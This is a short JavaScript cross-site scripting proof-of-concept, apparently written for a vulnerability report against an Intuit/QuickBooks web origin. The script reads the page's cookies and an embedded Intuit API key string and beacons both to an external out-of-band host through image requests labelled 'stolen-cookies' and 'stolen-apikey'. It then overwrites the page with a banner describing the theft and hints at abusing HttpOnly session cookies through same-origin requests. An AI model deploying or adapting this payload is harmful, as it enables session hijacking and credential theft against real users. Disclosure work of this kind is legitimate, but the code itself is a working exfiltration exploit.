(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var c=document.cookie;
var apikey='Intuit_APIKey intuit_apikey=prdakyresHrPbNYmoGmqMbZzZslfhGPRbBpwMfzE, intuit_apikey_version=1.0';

new Image().src=O+'/stolen-cookies?c='+encodeURIComponent(c.substring(0,900));
if(c.length>900) new Image().src=O+'/stolen-cookies2?c='+encodeURIComponent(c.substring(900,1800));
new Image().src=O+'/stolen-apikey?k='+encodeURIComponent(apikey);

if(!document.body){document.documentElement.appendChild(document.createElement('body'))}
document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'
+'[*] XSS Credential Exfiltration PoC\n'
+'[*] Origin: '+location.origin+'\n\n'
+'[1] Accessible cookies sent to attacker OAST:\n\n'
+c.replace(/; /g,';\n')+'\n\n'
+'[2] API Authorization header sent to attacker OAST:\n\n'
+'Authorization: '+apikey+'\n\n'
+'[3] Note: qbn.ticket/qbn.authid/qbn.agentid are HttpOnly\n'
+'    (not readable by JS, but still sent automatically\n'
+'     with same-origin fetch requests — see password\n'
+'     change PoC for direct exploitation)\n'
+'</pre>';
}catch(e){
new Image().src='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun/p46-err?e='+encodeURIComponent(e.message);
}
})();
